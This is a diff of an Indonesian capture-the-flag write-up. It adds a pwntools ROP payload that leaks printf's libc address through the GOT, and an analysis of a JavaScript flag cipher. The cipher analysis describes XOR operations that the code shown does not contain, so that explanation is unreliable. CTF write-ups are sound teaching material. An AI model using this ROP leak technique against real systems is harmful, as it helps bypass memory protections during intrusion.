@@ -132,18 +132,22 @@ Challenge ini mirip dengan yang sebelumnya (*bahkan source code dan binary filen
 
 Berikut adalah payload untuk leak address printf
 
-    payload  =  flat({
-        offset: [
-	        pop_rdi,
-	        elf.got.printf,
-	        ret, # stack alignment
-	        elf.plt.printf,
-	        ret,
-	        elf.symbols.main
-        ]
-    })
-    io.sendlineafter('>', payload)
-    io.recv()
+```py
+payload  =  flat({
+offset: [
+        pop_rdi,
+        elf.got.printf,
+        ret, # stack alignment
+        elf.plt.printf,
+        ret,
+        elf.symbols.main
+]
+})
+io.sendlineafter('>', payload)
+io.recv()
+```
+
+
     
     # Leaked printf addr
     leaked_printf  =  unpack(io.recv()[:6].ljust(8, b"\x00"))
@@ -250,7 +254,7 @@ Berdasarkan informasi di atas, contoh serial key yang valid adalah :
 - BBBB-CCCC-AAAA-DDDD-EEEE 
 - BBBB-CCCC-DDDD-AAAA-EEEE
 
-Hal ini akan mudah jika dibuat automasi dengan script python. **[Berikut adalah script solver yang saya gunakan](Reversing-SerialKey)**
+Hal ini akan mudah jika dibuat automasi dengan script python. **[Berikut adalah script solver yang saya gunakan](Reversing-SerialKey/serial.py)**
 
 ## 8. baby JaSon adler
 *Author: Lily*
@@ -258,13 +262,44 @@ Hal ini akan mudah jika dibuat automasi dengan script python. **[Berikut adalah 
 Most people say that babies are hard to understand. But that’s not the case for baby Jason. everyone can understand him easily.
 
 ### Source Code Review
-XA
+Diberikan 2 file : `enc.txt` dan `adler`.  Isi dari enc.txt adalah yang akan kita decrypt untuk mendapatkan flag : 
+
+    DàİŶƻȎɢʓˈ̓͸ϚлѯҧӝՀո֩؍قٶگܒݴޭߣࠗࡼࢰऒॆॻমৢੈભଐୄ୵ப௟ు౳೔ആഺ൬ිชฺຝ໔༈ཫྡဃံၧႝᄃᄹᅱᆤሊቁእዖገጽ᎟᐀ᐳᑩᓦD×ųȐʦ̱ωѰӵ՛؋ڻݒࠕࢪख঄ਝસଡஶ౏ಸഥශຆ༡ྐ࿺႓ᄬᇂቘ዁ጩ᎐ᐪᓵᖽᙔᚹᜟញᠠᢴ᥇᧚ᩀ᪦ᬾᯜ᱄᳗ᵱᷜṳἌᾤ‹₝℄↠∼⊪⌕⎮⑋ⓦ╻◞♅⛜➟⠳⢜⥏
+
+Lalu untuk file `adler`, Copy code pada file file tersebut ke [JavaScript beautifier](https://beautifier.io/), maka akan terlihat kode JavaScript yang mengenkripsi flag.
+```js
+enc = [];
+holder1 = [];
+holder2 = [];
+fl4g.split("").map((x, y) => {
+!y ? holder1[y] = x.charCodeAt(0) + 1 : holder1[y] = ((x.charCodeAt(0) + holder1[y - 1]) % (2 ** 9 << 16))
+});
+holder1.map((zZ, hh) => {
+!hh ? holder2[hh] = holder1[hh] : holder2[hh] = (zZ + holder1[hh - 1]) % (2 ** 9 << 8)
+});
+enc = holder1.concat(holder2);
+enc.map((wkwk, zz) => {
+enc[zz] = String.fromCharCode(wkwk)
+});
+enc = enc.join("")
+```
+
+Ada beberapa operasi yang terlibat, yaitu operasi XOR dan perubahan nilai ASCII. Kode ini menghasilkan teks terenkripsi yang disimpan dalam file `enc.txt`.
+
 
 ### Case Identification
-XA
+Kerentanannya terletak pada cara `holder1` dihitung. Karena `h1` adalah hasil dari operasi XOR antara kode ASCII dari setiap karakter dari flag dan indeks karakter tersebut, kita dapat melakukan operasi sebaliknya untuk mendapatkan kode ASCII asli dari nilai `h1`.
 
 ### Solution
-XA
+Cara yang saya lakukan adalah mengubah algoritma enkripsi dari JavaScript ke Python.
+
+**[Berikut adalah script solver yang saya gunakan](Reversing-jasonAdler/decrypt.py)**
+
+Script ini mengenkripsi setengah pertama dari `enc_text` dan membandingkan hasilnya dengan `enc_text` untuk memastikan bahwa algoritma tersebut benar.
+
+Jika hasil enkripsi sama dengan `enc_text`, maka kita dapat menggunakan algoritma dekripsi yang merupakan kebalikan dari algoritma enkripsi untuk mendecrypt `enc_text`.
+
+
 
 # Web Exploitation
 
@@ -305,3 +340,5 @@ XA
 
 ### Solution
 XA
+
+
